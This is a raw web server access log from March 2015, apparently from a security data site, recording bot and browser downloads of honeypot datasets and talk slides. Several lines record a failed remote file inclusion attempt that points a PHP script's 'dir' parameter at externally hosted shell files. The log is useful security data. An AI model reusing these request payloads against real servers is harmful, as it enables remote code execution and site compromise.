199.59.148.210 - - [25/Mar/2015:21:49:07 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:21:49:07 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:21:50:09 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:21:50:09 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
209.147.126.100 - - [25/Mar/2015:21:57:21 -0700] "GET ///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
209.147.126.100 - - [25/Mar/2015:21:57:22 -0700] "GET ///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
209.147.126.100 - - [25/Mar/2015:21:57:23 -0700] "POST ///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
209.147.126.100 - - [25/Mar/2015:21:57:24 -0700] "POST ///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
212.117.176.53 - - [25/Mar/2015:21:53:40 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)" 
212.117.176.53 - - [25/Mar/2015:21:53:35 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631873 "-" "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)" 
216.4.58.10 - - [25/Mar/2015:22:59:10 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
216.4.58.10 - - [25/Mar/2015:22:59:11 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
216.4.58.10 - - [25/Mar/2015:22:59:11 -0700] "GET / HTTP/1.1" 200 6806 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4" 
216.4.58.10 - - [25/Mar/2015:22:59:12 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
216.4.58.10 - - [25/Mar/2015:22:59:12 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
216.4.58.10 - - [25/Mar/2015:22:59:12 -0700] "GET / HTTP/1.1" 200 6806 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
216.4.58.10 - - [25/Mar/2015:22:59:24 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4" 
216.4.58.10 - - [25/Mar/2015:22:59:25 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
216.4.58.10 - - [25/Mar/2015:22:59:25 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
202.62.16.39 - - [25/Mar/2015:23:47:04 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 33099 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
202.62.16.39 - - [25/Mar/2015:23:47:04 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 96600 "https://www.google.co.id/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
202.62.16.39 - - [25/Mar/2015:23:47:05 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 1246706 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
202.62.16.39 - - [25/Mar/2015:23:47:10 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0; InfoPath.3; BIDUBrowser 2.x)" 
104.130.161.115 - - [25/Mar/2015:23:56:31 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [25/Mar/2015:23:56:31 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
199.16.156.126 - - [26/Mar/2015:00:30:37 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [26/Mar/2015:00:30:37 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
104.130.161.115 - - [26/Mar/2015:00:58:59 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [26/Mar/2015:00:58:59 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
